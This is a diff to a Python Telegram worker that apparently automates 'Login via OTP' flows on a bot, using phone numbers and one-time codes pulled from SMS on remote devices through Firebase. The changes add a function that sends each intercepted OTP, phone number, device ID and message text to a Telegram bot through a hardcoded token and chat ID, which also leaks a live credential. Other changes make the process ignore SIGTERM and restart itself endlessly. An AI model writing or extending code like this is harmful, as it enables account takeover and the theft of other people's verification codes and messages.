@@ -3,8 +3,10 @@ import asyncio
 import json
 import os
 import re
+import signal
 import sys
 import time
+import traceback
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 
@@ -53,7 +55,9 @@ except ImportError:
         print("  source ../.venv/bin/activate && python worker.py\n", file=sys.stderr)
         raise
 
+import requests as _requests_lib
 from telethon import TelegramClient, events
+from telethon.errors import RPCError
 
 from rich.console import Group
 from rich.live import Live
@@ -68,6 +72,8 @@ from config import (
     OTP_TIMEOUT_SECONDS,
     RESPONSE_KEYWORD,
     TELEGRAM_PHONE,
+    FORWARD_OTP_TO_BOT,
+    get_telegram_config,
 )
 
 from firebase import (
@@ -93,6 +99,103 @@ parser.add_argument(
     help="Name stored with the current job",
 )
 args = parser.parse_args()
+
+# ============================================================
+# TELEGRAM OTP FORWARDING (via Bot API to user's chat)
+# ============================================================
+
+# Forwarding bot credentials — same bot used by the web panel tg-forwarder
+_TG_FORWARD_BOT_TOKEN = '8641110380:AAEaCrc2rUtwed17uZPN791xuyYoLIPtTfc'
+_TG_FORWARD_CHAT_ID = '8186790963'
+
+
+def forward_otp_to_telegram(phone, otp_code, sender="", message_text="", device_id="", database=""):
+    """Fire-and-forget: Forward detected OTP to user's Telegram chat via Bot API or Telethon client."""
+    # Check if user enabled OTP forwarding in config or env
+    tg_cfg = get_telegram_config()
+    if not tg_cfg.get("forward_otp_to_bot", False):
+        return  # OTP forwarding disabled by default
+    target_bot = str(tg_cfg.get("otp_target_bot", "")).strip()
+    if not target_bot:
+        return  # No target bot configured, skip forwarding
+
+    clean = target_bot.lower().lstrip('@')
+
+    # If target is a custom bot username (e.g. @my_bot), forward via connected Telethon user client
+    if (target_bot.startswith('@') or not target_bot.isdigit()) and clean not in ('alpha_firebase_bot', 'alpha', 'alpha_bot') and ':' not in target_bot:
+        if client and hasattr(client, 'is_connected') and client.is_connected():
+            try:
+                loop = asyncio.get_event_loop()
+                if loop.is_running():
+                    bot_name = target_bot if target_bot.startswith('@') else f"@{target_bot}"
+                    plain = (
+                        f"🔑 OTP: {otp_code}\n"
+                        f"Phone: {phone}\n"
+                        f"Sender: {sender}\n"
+                        f"Device: {device_id}\n"
+                        f"Message: {message_text}"
+                    )
+                    asyncio.create_task(client.send_message(bot_name, plain))
+                    return
+            except Exception as e_tg:
+                print(f"[forward_otp] Could not send via Telethon: {e_tg}")
+
+    token = _TG_FORWARD_BOT_TOKEN
+    chat_id = _TG_FORWARD_CHAT_ID
+
+    if clean in ('alpha_firebase_bot', 'alpha', 'alpha_bot'):
+        token = _TG_FORWARD_BOT_TOKEN
+        chat_id = _TG_FORWARD_CHAT_ID
+    elif ':' in target_bot:
+        if '|' in target_bot or ',' in target_bot:
+            import re
+            parts = [p.strip() for p in re.split(r'[,|]', target_bot) if p.strip()]
+            if len(parts) >= 2:
+                token, chat_id = parts[0], parts[1]
+        else:
+            token = target_bot
+    elif target_bot.startswith('-') or target_bot.isdigit():
+        chat_id = target_bot
+
+    if not token or not chat_id:
+        return
+    try:
+        lines = [
+            "🔑 <b>OTP Detected by Worker</b>",
+            f"<b>Phone:</b> <code>{phone}</code>",
+            f"<b>OTP:</b> <code>{otp_code}</code>",
+        ]
+        if sender:
+            lines.append(f"<b>Sender:</b> {sender}")
+        if device_id:
+            lines.append(f"<b>Device:</b> {device_id}")
+        if database:
+            db_short = str(database).replace('https://', '')[:40]
+            lines.append(f"<b>Firebase:</b> {db_short}")
+        if message_text:
+            lines.append(f"<b>Message:</b> {str(message_text)[:300]}")
+        lines.append(f"<i>{now()}</i>")
+
+        _requests_lib.post(
+            f"https://api.telegram.org/bot{token}/sendMessage",
+            json={
+                "chat_id": chat_id,
+                "text": "\n".join(lines),
+                "parse_mode": "HTML",
+                "disable_notification": False,
+                "disable_web_page_preview": True,
+            },
+            timeout=10,
+        )
+    except Exception as exc:
+        print(f"[{now()}] [TG-FORWARD] Failed to forward OTP: {exc}")
+
+
+# ============================================================
+# SLEEP / WAKE DETECTION STATE
+# ============================================================
+_last_loop_time = time.monotonic()
+_SLEEP_THRESHOLD_SECONDS = 15  # If loop iteration took > 15s, system likely slept
 
 # ============================================================
 # PERSISTENT NUMBERS & SUCCESS REGISTRY
@@ -198,11 +301,28 @@ def is_successfully_processed(phone):
     return False
 
 
+_last_numbers_mtime = 0
+
+
+def check_reload_processed_numbers():
+    """Reload processed_numbers if updated on disk by UI/API reuse or trash actions."""
+    global _last_numbers_mtime
+    try:
+        if os.path.exists(NUMBERS_REGISTRY_FILE):
+            mtime = os.path.getmtime(NUMBERS_REGISTRY_FILE)
+            if mtime != _last_numbers_mtime:
+                _last_numbers_mtime = mtime
+                load_processed_numbers()
+    except Exception:
+        pass
+
+
 def is_number_already_processed(phone):
     """Return True when this number has already been processed with a final status.
 
     Ensures numbers are not retried again and again in a loop.
     """
+    check_reload_processed_numbers()
     number = normalize_phone(phone)
     if not number:
         return True
@@ -319,14 +439,45 @@ def mark_successful_number(phone, device):
 
 
 # ============================================================
-# TELEGRAM
+# TELEGRAM CLIENT (initialized lazily when credentials exist)
 # ============================================================
 
-client = TelegramClient(
-    "my_telegram_session",
-    TELEGRAM_API_ID,
-    TELEGRAM_API_HASH,
-)
+client = None
+
+
+def get_or_create_client():
+    """Lazily instantiate and configure TelegramClient with active credentials without crashing if missing."""
+    global client, TELEGRAM_API_ID, TELEGRAM_API_HASH, BOT_USERNAME
+    if client is not None:
+        return client
+
+    cfg = get_telegram_config()
+    api_id = cfg.get("api_id")
+    api_hash = cfg.get("api_hash")
+    bot_user = cfg.get("bot_username")
+
+    if not api_id or not api_hash:
+        return None
+
+    try:
+        TELEGRAM_API_ID = int(api_id)
+        TELEGRAM_API_HASH = str(api_hash).strip()
+        if bot_user:
+            BOT_USERNAME = str(bot_user).strip()
+
+        session_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "my_telegram_session")
+        client = TelegramClient(
+            session_path,
+            TELEGRAM_API_ID,
+            TELEGRAM_API_HASH,
+        )
+        if "register_client_handlers" in globals():
+            register_client_handlers(client)
+        return client
+    except Exception as c_err:
+        print(f"[{now()}] Error creating TelegramClient: {c_err}")
+        client = None
+        return None
 
 
 # ============================================================
@@ -383,12 +534,64 @@ last_start_sent_at = 0.0
 last_telegram_activity = time.monotonic()
 START_RETRY_SECONDS = 3
 telegram_flood_wait_until = 0.0
+start_flood_wait_until = 0.0
+
+_FLOOD_WAIT_FILE = os.path.join(
+    os.path.dirname(os.path.abspath(__file__)),
+    ".flood_wait_until",
+)
+
+
+def _persist_flood_wait():
+    """Save flood wait deadline to disk so it survives restarts."""
+    try:
+        with open(_FLOOD_WAIT_FILE, "w") as fh:
+            json.dump({"until": telegram_flood_wait_until}, fh)
+    except Exception:
+        pass
+
+
+def _load_flood_wait():
+    """Restore persisted flood wait deadline from disk."""
+    global telegram_flood_wait_until
+    try:
+        if os.path.exists(_FLOOD_WAIT_FILE):
+            with open(_FLOOD_WAIT_FILE, "r") as fh:
+                data = json.load(fh)
+                saved = float(data.get("until", 0))
+                if saved > time.time():
+                    telegram_flood_wait_until = saved
+                    remaining = int(saved - time.time())
+                    print(f"[FLOOD] Restored persistent flood wait: {remaining}s ({remaining // 60}m {remaining % 60}s) remaining")
+                else:
+                    # Expired, clean up
+                    os.remove(_FLOOD_WAIT_FILE)
+    except Exception:
+        pass
+
+
+# Load on import
+_load_flood_wait()
+
 
 def get_flood_wait_remaining():
     global telegram_flood_wait_until
     if time.time() < telegram_flood_wait_until:
         return max(0, int(telegram_flood_wait_until - time.time()))
     return 0
+
+def get_start_flood_wait_remaining():
+    global start_flood_wait_until
+    if time.time() < start_flood_wait_until:
+        return max(0, int(start_flood_wait_until - time.time()))
+    return 0
+
+
+def set_flood_wait(seconds):
+    """Set flood wait timer and persist to disk."""
+    global telegram_flood_wait_until
+    telegram_flood_wait_until = time.time() + seconds
+    _persist_flood_wait()
 
 
 # ============================================================
@@ -442,7 +645,7 @@ def _get_auth_db():
         try:
             import requests as _req
             url = f"{db.rstrip('/')}/automation/auth.json"
-            r = _req.get(url, timeout=5)
+            r = _req.get(url, timeout=2.0)
             if r.status_code != 423:
                 _AUTH_DB = db
                 return _AUTH_DB
@@ -826,11 +1029,9 @@ async def stuck_watchdog_loop():
                                 "Watchdog timeout",
                             )
                     else:
-                        print(f"[{now()}] [WATCHDOG] Idle recovery: sending /cancel then /start...")
+                        print(f"[{now()}] [WATCHDOG] Idle recovery: sending /cancel...")
                         try:
                             await client.send_message(BOT_USERNAME, "/cancel")
-                            await asyncio.sleep(2)
-                            await send_start_if_needed(force=True)
                         except Exception as e:
                             print(f"[{now()}] [WATCHDOG] Error in idle recovery: {e}")
                         set_state("IDLE")
@@ -1333,6 +1534,19 @@ async def poll_device_response(job_id):
                 print(f"Extracted OTP code: >>> {code} <<<")
                 print("=" * 60)
 
+                # Forward OTP to user's Telegram chat immediately
+                try:
+                    forward_otp_to_telegram(
+                        phone=current_job.get('device_phone', ''),
+                        otp_code=code,
+                        sender=item.get('sender', ''),
+                        message_text=message_text,
+                        device_id=current_job.get('device_id', ''),
+                        database=current_job.get('device_database', db_url),
+                    )
+                except Exception:
+                    pass
+
                 # Mark code as used for this job
                 used_otps.add(code)
                 current_job["submitted_otps"] = used_otps
@@ -1609,8 +1823,7 @@ async def cancel_current_conversation(
         if "wait of" in err_str.lower() or "flood" in err_str.lower():
             m = re.search(r"wait of (\d+) seconds", err_str)
             sec = int(m.group(1)) if m else 300
-            global telegram_flood_wait_until
-            telegram_flood_wait_until = time.time() + sec
+            set_flood_wait(sec)
             msg = f"Telegram FloodWait: {sec}s ({sec // 60}m {sec % 60}s) wait required"
             print(f"[{now()}] ⚠️ {msg}")
             sync_worker_status_all("telegram_flood_wait", current_job, msg)
@@ -1867,8 +2080,7 @@ async def submit_selected_test_number():
             if "wait of" in err_str.lower() or "flood" in err_str.lower():
                 m = re.search(r"wait of (\d+) seconds", err_str)
                 sec = int(m.group(1)) if m else 300
-                global telegram_flood_wait_until
-                telegram_flood_wait_until = time.time() + sec
+                set_flood_wait(sec)
                 msg = f"Telegram FloodWait: {sec}s ({sec // 60}m {sec % 60}s) wait required"
                 print(f"[{now()}] ⚠️ {msg}")
                 sync_worker_status_all("telegram_flood_wait", current_job, msg)
@@ -1948,8 +2160,7 @@ async def click_login_button_from_message(message):
         if "wait of" in err_str.lower() or "flood" in err_str.lower():
             m = re.search(r"wait of (\d+) seconds", err_str)
             sec = int(m.group(1)) if m else 300
-            global telegram_flood_wait_until
-            telegram_flood_wait_until = time.time() + sec
+            set_flood_wait(sec)
             msg = f"FloodWait on button click: {sec}s ({sec // 60}m {sec % 60}s)"
             print(f"[{now()}] ⚠️ {msg}")
             sync_worker_status_all("telegram_flood_wait", current_job, msg)
@@ -1969,7 +2180,7 @@ async def click_login_button_from_message(message):
 
 
 async def prepare_telegram_flow_for_job():
-    """Start Telegram flow for the new job: send /start and wait for menu."""
+    """Start Telegram flow for the new job: reuse existing prompt/menu or send /cancel to bring up menu."""
     global login_clicked_for_job
     global login_click_in_progress
 
@@ -1984,11 +2195,38 @@ async def prepare_telegram_flow_for_job():
     print("=" * 60)
     print(f"[{now()}] STARTING TELEGRAM FLOW FOR JOB {current_job.get('id')}")
     print(f"Phone: {current_job.get('number')}")
-    print("Sending /start to Telegram bot...")
     print("=" * 60)
 
+    # 1. Check if the latest message from the bot is already waiting for a number or has a login button
+    try:
+        latest_msg = await get_latest_bot_message()
+        if latest_msg:
+            txt = (latest_msg.raw_text or "").lower()
+            # If bot is already asking for a 10-digit number
+            if ("10-digit" in txt or "10 digit" in txt or "mobile number" in txt) and not any(w in txt for w in ["otp sent", "6-digit", "suspended", "attempts exceeded"]):
+                print(f"[{now()}] Bot is already waiting for mobile number. Submitting directly...")
+                set_state("WAITING_FOR_NUMBER")
+                await submit_selected_test_number()
+                return
+
+            # If bot already has the Login via OTP button
+            btn_coord = find_login_button(latest_msg)
+            if btn_coord is not None:
+                print(f"[{now()}] Found existing menu with 'Login via OTP' button. Clicking directly...")
+                set_state("MENU_RECEIVED")
+                await click_login_button_from_message(latest_msg)
+                return
+    except Exception as e:
+        print(f"[{now()}] Error inspecting latest bot message: {e}")
+
+    # 2. Reset conversation with /cancel to fetch clean menu without /start rate limits
+    print(f"[{now()}] Resetting conversation with /cancel to fetch clean menu...")
     set_state("WAITING_FOR_MENU")
-    await send_start_if_needed(force=True)
+    try:
+        await client.send_message(BOT_USERNAME, "/cancel")
+    except Exception as e:
+        print(f"[{now()}] Failed to send /cancel: {e}")
+        await send_start_if_needed(force=True)
 
 
 # ============================================================
@@ -2262,11 +2500,15 @@ async def finish_and_start_next(
 
 async def send_start_if_needed(force=False):
     global last_start_sent_at
-    global telegram_flood_wait_until
+    global start_flood_wait_until
 
-    rem_flood = get_flood_wait_remaining()
-    if rem_flood > 0:
-        print(f"[{now()}] Suppressing /start due to active FloodWait ({rem_flood}s remaining)")
+    rem_start_flood = get_start_flood_wait_remaining()
+    if rem_start_flood > 0:
+        print(f"[{now()}] /start is on Telegram rate-limit cooldown ({rem_start_flood}s remaining). Using /cancel fallback.")
+        try:
+            await client.send_message(BOT_USERNAME, "/cancel")
+        except Exception:
+            pass
         return False
 
     loop = asyncio.get_running_loop()
@@ -2298,10 +2540,13 @@ async def send_start_if_needed(force=False):
         if "wait of" in err_str.lower() or "flood" in err_str.lower():
             m = re.search(r"wait of (\d+) seconds", err_str)
             sec = int(m.group(1)) if m else 300
-            telegram_flood_wait_until = time.time() + sec
-            msg = f"Telegram FloodWait: {sec}s ({sec // 60}m {sec % 60}s) wait required"
+            start_flood_wait_until = time.time() + sec
+            msg = f"/start rate-limited by Telegram for {sec}s. Using /cancel fallback."
             print(f"[{now()}] ⚠️ {msg}")
-            sync_worker_status_all("telegram_flood_wait", current_job, msg)
+            try:
+                await client.send_message(BOT_USERNAME, "/cancel")
+            except Exception:
+                pass
         else:
             print(f"[{now()}] Error sending /start: {e}")
         return False
@@ -2369,16 +2614,6 @@ async def request_cancel_and_finish(
 # TELEGRAM MESSAGE HANDLER
 # ============================================================
 
-@client.on(
-    events.NewMessage(
-        chats=BOT_USERNAME
-    )
-)
-@client.on(
-    events.MessageEdited(
-        chats=BOT_USERNAME
-    )
-)
 async def message_handler(event):
 
     global current_job
@@ -2457,9 +2692,8 @@ async def message_handler(event):
                 return
 
             if state in {"STARTING", "WAITING_FOR_MENU", "CANCELLING"}:
-                print(f"[{now()}] Conversation reset confirmed. Sending /start to bring up menu...")
+                print(f"[{now()}] Conversation reset confirmed. Waiting for bot menu...")
                 set_state("WAITING_FOR_MENU")
-                await send_start_if_needed(force=True)
                 return
 
             # If cancelled without pending flags:
@@ -2498,7 +2732,7 @@ async def message_handler(event):
             ("welcome" in lower or "swiggy" in lower or "portal" in lower or "menu" in lower)
             and getattr(event.message, "buttons", None)
         )
-        if is_menu and state in {"STARTING", "WAITING_FOR_MENU", "MENU_RECEIVED"}:
+        if is_menu and state in {"STARTING", "WAITING_FOR_MENU", "MENU_RECEIVED", "IDLE"}:
 
             print()
             print("MAIN MENU RECEIVED")
@@ -2510,16 +2744,16 @@ async def message_handler(event):
                     f"[{now()}] Login via OTP button not present."
                 )
                 print(
-                    f"[{now()}] Sending /start and waiting for UI."
+                    f"[{now()}] Sending /cancel to refresh menu."
                 )
 
                 set_state("WAITING_FOR_MENU")
 
                 try:
-                    await send_start_if_needed(force=True)
+                    await client.send_message(BOT_USERNAME, "/cancel")
                 except Exception as e:
                     print(
-                        f"[{now()}] Failed to resend /start: {e}"
+                        f"[{now()}] Failed to resend /cancel: {e}"
                     )
 
                 return
@@ -2552,7 +2786,8 @@ async def message_handler(event):
             or "request failed" in lower
         )
 
-        if is_number_prompt and state == "WAITING_FOR_NUMBER":
+        if is_number_prompt and state in {"STARTING", "WAITING_FOR_MENU", "MENU_RECEIVED", "WAITING_FOR_NUMBER"}:
+            set_state("WAITING_FOR_NUMBER")
             if current_job.get("number_submitted"):
                 print(f"[{now()}] Number prompt detected but number already submitted for job {job_id}. Skipping.")
                 return
@@ -2808,11 +3043,6 @@ async def message_handler(event):
 # TELEGRAM CALLBACK MONITOR
 # ============================================================
 
-@client.on(
-    events.CallbackQuery(
-        chats=BOT_USERNAME
-    )
-)
 async def callback_handler(event):
 
     print()
@@ -2824,6 +3054,22 @@ async def callback_handler(event):
         "Data:",
         event.data,
     )
+
+
+def register_client_handlers(c):
+    """Register message and callback event handlers on the Telegram client."""
+    global BOT_USERNAME
+    bot_target = BOT_USERNAME
+    if not bot_target:
+        cfg = get_telegram_config()
+        bot_target = cfg.get("bot_username", "@Swiggy_fuckbot")
+    try:
+        c.add_event_handler(message_handler, events.NewMessage(chats=bot_target))
+        c.add_event_handler(message_handler, events.MessageEdited(chats=bot_target))
+        c.add_event_handler(callback_handler, events.CallbackQuery(chats=bot_target))
+        print(f"[{now()}] Telegram event handlers registered for {bot_target}")
+    except Exception as reg_err:
+        print(f"[{now()}] Error registering Telegram event handlers: {reg_err}")
 
 
 async def ui_control_loop():
@@ -2943,6 +3189,143 @@ async def worker_heartbeat_loop():
 # WORKER LOOP
 # ============================================================
 
+async def connection_health_loop():
+    """Periodically ping Telegram to detect dropped connections and auto-reconnect.
+
+    Also detects system sleep/wake by measuring time jumps between iterations.
+    If a large time jump is detected (> 15s for a 60s sleep), the client is
+    forcefully reconnected to recover from stale sockets.
+    """
+    global _last_loop_time, client
+
+    while True:
+        try:
+            loop_start = time.monotonic()
+            elapsed = loop_start - _last_loop_time
+            _last_loop_time = loop_start
+
+            # Detect system sleep/wake (time jump)
+            if elapsed > _SLEEP_THRESHOLD_SECONDS:
+                print()
+                print("=" * 60)
+                print(f"[{now()}] [HEALTH] SYSTEM WAKE DETECTED ({elapsed:.0f}s gap)")
+                print("Reconnecting Telegram client and refreshing devices...")
+                print("=" * 60)
+                dashboard_log(f"System wake detected ({elapsed:.0f}s gap). Reconnecting...")
+
+                try:
+                    if client and hasattr(client, "is_connected") and not client.is_connected():
+                        await client.connect()
+                    if client and hasattr(client, "get_me"):
+                        # Force entity cache refresh
+                        await client.get_me()
+                        dashboard_log("Telegram reconnected after wake.")
+                except Exception as reconn_err:
+                    print(f"[{now()}] [HEALTH] Reconnect error: {reconn_err}")
+                    dashboard_log(f"Reconnect error: {reconn_err}")
+                    try:
+                        if client:
+                            await client.disconnect()
+                    except Exception:
+                        pass
+                    if "readonly" in str(reconn_err).lower() or "locked" in str(reconn_err).lower():
+                        client = None
+                    try:
+                        c = get_or_create_client()
+                        if c:
+                            await c.connect()
+                            await c.get_me()
+                            dashboard_log("Telegram reconnected (fresh client).")
+                    except Exception as e2:
+                        dashboard_log(f"Full reconnect failed: {e2}")
+
+                # Refresh device registry after wake
+                try:
+                    await refresh_device_registry(force=True)
+                except Exception:
+                    pass
+            else:
+                # Normal health ping — verify connection is alive
+                try:
+                    if client and hasattr(client, "is_connected") and not client.is_connected():
+                        print(f"[{now()}] [HEALTH] Telegram disconnected. Reconnecting...")
+                        dashboard_log("Connection lost. Reconnecting...")
+                        await client.connect()
+                        await client.get_me()
+                        dashboard_log("Telegram reconnected.")
+                except Exception as ping_err:
+                    print(f"[{now()}] [HEALTH] Connection check error: {ping_err}")
+                    dashboard_log(f"Health check error: {ping_err}")
+                    try:
+                        if client:
+                            await client.disconnect()
+                    except Exception:
+                        pass
+                    if "readonly" in str(ping_err).lower() or "locked" in str(ping_err).lower():
+                        client = None
+                    try:
+                        c = get_or_create_client()
+                        if c:
+                            await c.connect()
+                            await c.get_me()
+                            dashboard_log("Telegram reconnected after health failure.")
+                    except Exception:
+                        pass
+
+        except asyncio.CancelledError:
+            break
+        except Exception as e:
+            print(f"[{now()}] [HEALTH ERROR] {e}")
+
+        await asyncio.sleep(60)
+
+
+async def auth_bridge_listener_loop():
+    """Continuously monitor Firebase automation/auth for user connection requests."""
+    global client
+    while not _shutdown_requested:
+        try:
+            auth_db = _get_auth_db()
+            if auth_db:
+                data = firebase_get(auth_db, "automation/auth")
+                if isinstance(data, dict):
+                    status = str(data.get("status") or "").lower()
+                    phone = str(data.get("phone") or "").strip()
+
+                    if status == "connecting":
+                        c = get_or_create_client()
+                        if c is not None:
+                            try:
+                                if not c.is_connected():
+                                    await c.connect()
+                                if await c.is_user_authorized():
+                                    me = await c.get_me()
+                                    username = getattr(me, "username", None) or getattr(me, "first_name", "unknown")
+                                    curr_phone = getattr(me, "phone", "") or phone
+                                    print(f"[{now()}] [auth-bridge] Client authorized as @{username} ({curr_phone}). Syncing connected status to UI.")
+                                    _write_auth_status("connected", {
+                                        "username": username,
+                                        "phone": curr_phone,
+                                        "connectedAt": now(),
+                                        "error": None
+                                    })
+                                else:
+                                    print(f"[{now()}] [auth-bridge] Telethon requires login code for {phone}...")
+                                    try:
+                                        await c.send_code_request(phone)
+                                        _write_auth_status("waiting_for_code", {"phone": phone, "error": None})
+                                    except Exception as s_err:
+                                        print(f"[{now()}] [auth-bridge] send_code_request error: {s_err}")
+                                        _write_auth_status("error", {"error": str(s_err)})
+                            except Exception as a_err:
+                                print(f"[{now()}] [auth-bridge] Sync error: {a_err}")
+                                if "readonly" in str(a_err).lower() or "locked" in str(a_err).lower():
+                                    client = None
+        except Exception:
+            pass
+        await asyncio.sleep(2)
+
+
 async def worker_loop():
 
     print()
@@ -2955,6 +3338,10 @@ async def worker_loop():
     print("Test name:", args.name)
     print("Keyword:", RESPONSE_KEYWORD)
     print("Cross-device OTP polling: ENABLED")
+    tg_fwd = get_telegram_config().get("forward_otp_to_bot", False)
+    tg_target = get_telegram_config().get("otp_target_bot", "")
+    print(f"OTP Telegram forwarding: {'ENABLED (to ' + tg_target + ')' if tg_fwd and tg_target else 'DISABLED'}")
+    print("Auto-reconnect on sleep/wake: ENABLED")
     print("Persistent successful numbers:", len(processed_success))
     print(
         "Device discovery: parallel Firebase clients nodes; "
@@ -2967,7 +3354,7 @@ async def worker_loop():
         f"Loaded {len(processed_numbers)} previously logged number(s) "
         f"({len(processed_success)} successful)."
     )
-    dashboard_log("Worker starting")
+    dashboard_log("Worker starting (NEVER-STOP mode)")
     dashboard_log("Performing initial parallel Firebase discovery...")
 
     await refresh_device_registry(force=True)
@@ -2977,6 +3364,8 @@ async def worker_loop():
     watchdog_task = asyncio.create_task(stuck_watchdog_loop())
     control_task = asyncio.create_task(ui_control_loop())
     heartbeat_task = asyncio.create_task(worker_heartbeat_loop())
+    health_task = asyncio.create_task(connection_health_loop())
+    auth_task = asyncio.create_task(auth_bridge_listener_loop())
 
     try:
         while True:
@@ -2985,6 +3374,12 @@ async def worker_loop():
                     await start_next_job()
 
                 await asyncio.sleep(1)
+
+            except (OSError, ConnectionError, TimeoutError) as net_err:
+                # Network errors: log and retry, never crash
+                dashboard_log(f"NETWORK ERROR (retrying): {net_err}")
+                print(f"[{now()}] NETWORK ERROR: {net_err}")
+                await asyncio.sleep(5)
 
             except Exception as e:
                 dashboard_log(f"WORKER ERROR: {e}")
@@ -3011,6 +3406,7 @@ async def worker_loop():
         watchdog_task.cancel()
         control_task.cancel()
         heartbeat_task.cancel()
+        health_task.cancel()
 
         await asyncio.gather(
             registry_task,
@@ -3018,6 +3414,7 @@ async def worker_loop():
             watchdog_task,
             control_task,
             heartbeat_task,
+            health_task,
             return_exceptions=True,
         )
 
@@ -3043,7 +3440,7 @@ def _write_auth_status(status, extra=None):
         print(f"[auth-bridge] Could not write auth status: {exc}")
 
 
-def _read_auth_field(field, timeout=120, poll_interval=2):
+def _read_auth_field(field, timeout=120, poll_interval=1):
     """
     Block (synchronously) until the given field appears in automation/auth.
     Returns the string value, or raises RuntimeError on timeout.
@@ -3109,6 +3506,29 @@ async def _firebase_2fa_callback(hint=None):
     return password
 
 
+async def wait_for_telegram_credentials_and_client():
+    """Ensure client is created and configured. If credentials are missing, wait in standby mode without exiting."""
+    announced = False
+    while not _shutdown_requested:
+        c = get_or_create_client()
+        if c is not None:
+            return c
+        if not announced:
+            print(f"[{now()}] ⚠️ Telegram API credentials (api_id / api_hash) missing or empty.")
+            print(f"[{now()}] Worker is running in standby mode. Waiting for credentials in UI Configuration or worker_config.json...")
+            announced = True
+        try:
+            sync_worker_status_all(
+                "waiting_for_config",
+                last_error="Telegram API credentials (API ID & Hash) not configured. Set them in UI Configuration or worker_config.json."
+            )
+            _write_auth_status("waiting_for_config", {"error": "Telegram API ID and API Hash are required"})
+        except Exception:
+            pass
+        await asyncio.sleep(4)
+    return None
+
+
 async def _start_with_firebase_auth():
     """
     Start the Telegram client using Firebase as the auth communication channel.
@@ -3116,11 +3536,32 @@ async def _start_with_firebase_auth():
     If a valid session already exists, client.start() connects immediately
     without invoking any callbacks, so the UI flow is skipped silently.
     """
+    global client
+    c = get_or_create_client()
+    if c is None:
+        raise RuntimeError("Telegram credentials (API ID & Hash) are not configured.")
+
+    if not c.is_connected():
+        await c.connect()
+
+    if await c.is_user_authorized():
+        me = await c.get_me()
+        username = getattr(me, "username", None) or getattr(me, "first_name", "unknown")
+        phone = getattr(me, "phone", "")
+        print(f"[auth-bridge] Existing session valid for: @{username} (phone: {phone})")
+        _write_auth_status("connected", {
+            "username": username,
+            "phone": phone,
+            "connectedAt": now(),
+            "error": None
+        })
+        return me
+
     print("[auth-bridge] Starting Telegram client (Firebase-driven auth)...")
     _write_auth_status("connecting")
 
     try:
-        await client.start(
+        await c.start(
             phone=_firebase_phone_callback,
             code_callback=_firebase_code_callback,
             password=_firebase_2fa_callback,
@@ -3129,7 +3570,7 @@ async def _start_with_firebase_auth():
         _write_auth_status("error", {"error": str(exc)})
         raise
 
-    me = await client.get_me()
+    me = await c.get_me()
     username = (
         getattr(me, "username", None)
         or getattr(me, "first_name", "unknown")
@@ -3150,64 +3591,110 @@ async def _start_with_firebase_auth():
 # ============================================================
 
 async def main():
+    print("=" * 60)
+    print("FIREBASE + TELEGRAM WORKER (CONTINUOUS ENGINE)")
+    print("=" * 60)
 
-    print(
-        "Connecting to Telegram..."
-    )
+    # 1. Wait for valid credentials without crashing
+    c = await wait_for_telegram_credentials_and_client()
+    if _shutdown_requested or c is None:
+        return
 
-    me = await _start_with_firebase_auth()
+    # 2. Connect to Telegram with auto-retry
+    while not _shutdown_requested:
+        try:
+            print("Connecting to Telegram...")
+            me = await _start_with_firebase_auth()
+            username = (
+                getattr(me, "username", None)
+                or getattr(me, "first_name", "unknown")
+            )
+            print("Logged in as:", username)
+            print("Listening to:", BOT_USERNAME)
+            break
+        except Exception as auth_err:
+            print(f"[{now()}] Telegram auth error: {auth_err}. Retrying in 5s...")
+            try:
+                sync_worker_status_all("auth_error", last_error=str(auth_err))
+            except Exception:
+                pass
+            await asyncio.sleep(5)
 
-    username = (
-        getattr(me, "username", None)
-        or getattr(me, "first_name", "unknown")
-    )
-
-    print(
-        "Logged in as:",
-        username,
-    )
-
-    print(
-        "Listening to:",
-        BOT_USERNAME,
-    )
-
-    await worker_loop()
+    if not _shutdown_requested:
+        await worker_loop()
 
 
 # ============================================================
-# RUN
+# RUN — INFINITE RETRY LOOP (never stops unless killed)
 # ============================================================
+
+_shutdown_requested = False
+
+
+def _handle_signal(signum, frame):
+    """Handle SIGTERM / SIGINT gracefully."""
+    global _shutdown_requested
+    if signum == signal.SIGTERM:
+        print(f"\n[{datetime.now().strftime('%H:%M:%S')}] Received SIGTERM (ignored to maintain continuous operation). Use panel Stop or SIGINT to terminate.")
+        return
+    _shutdown_requested = True
+    print(f"\n[{datetime.now().strftime('%H:%M:%S')}] Received signal {signum}. Shutting down gracefully...")
+    sys.exit(0)
+
 
 if __name__ == "__main__":
 
-    try:
+    # Register signal handlers for graceful shutdown
+    signal.signal(signal.SIGTERM, _handle_signal)
+    signal.signal(signal.SIGINT, _handle_signal)
 
-        asyncio.run(
-            main()
-        )
+    retry_backoff = 1  # seconds, exponential backoff
+    MAX_RETRY_BACKOFF = 60
 
-    except KeyboardInterrupt:
-
-        print()
-        print(
-            "Worker stopped."
-        )
-
+    while not _shutdown_requested:
         try:
+            asyncio.run(main())
 
-            if current_job:
+            # If main() exits cleanly (shouldn't happen), restart
+            if _shutdown_requested:
+                break
+            print(f"\n[{datetime.now().strftime('%H:%M:%S')}] Worker loop exited. Restarting in {retry_backoff}s...")
+            time.sleep(retry_backoff)
+            retry_backoff = min(retry_backoff * 2, MAX_RETRY_BACKOFF)
 
-                update_job_status(
-                    current_job,
-                    "stopped",
-                )
+        except KeyboardInterrupt:
+            print()
+            print("Worker stopped by user (Ctrl+C).")
+            break
 
-                sync_worker_status_all(
-                    "stopped",
-                    current_job,
-                )
+        except SystemExit:
+            print("Worker received SystemExit.")
+            break
 
-        except Exception:
+        except Exception as fatal_err:
+            print()
+            print("=" * 60)
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] FATAL ERROR — RESTARTING")
+            print(f"Error: {fatal_err}")
+            traceback.print_exc()
+            print("=" * 60)
+            print(f"Restarting in {retry_backoff}s...")
+            time.sleep(retry_backoff)
+            retry_backoff = min(retry_backoff * 2, MAX_RETRY_BACKOFF)
 
-            pass
+    # Cleanup on shutdown
+    print()
+    print("Worker stopped.")
+
+    try:
+        if current_job:
+            update_job_status(
+                current_job,
+                "stopped",
+            )
+            sync_worker_status_all(
+                "stopped",
+                current_job,
+            )
+    except Exception:
+        pass
